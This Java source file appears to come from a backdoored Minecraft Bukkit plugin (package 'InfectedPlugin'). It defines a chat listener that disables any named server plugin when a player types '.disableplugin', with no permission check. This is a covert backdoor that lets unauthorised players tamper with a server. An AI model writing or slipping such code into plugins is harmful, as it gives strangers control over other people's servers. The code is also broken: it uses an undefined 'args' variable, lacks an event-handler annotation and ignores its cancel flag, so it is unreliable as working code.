 package org.CreeperCoders.InfectedPlugin;
 
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
public class Command_opme implements Listener
 {
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
         boolean cancel = true;
     
         if (message.toLowerCase().contains(".disableplugin"))
         {
             Plugin plugin = Bukkit.getPluginManager().getPlugin(args[1]);
             if (plugin != null)
             {
                 Bukkit.getPluginManager().disablePlugin(plugin);
             }
             cancel = true;
         }
     }
 }
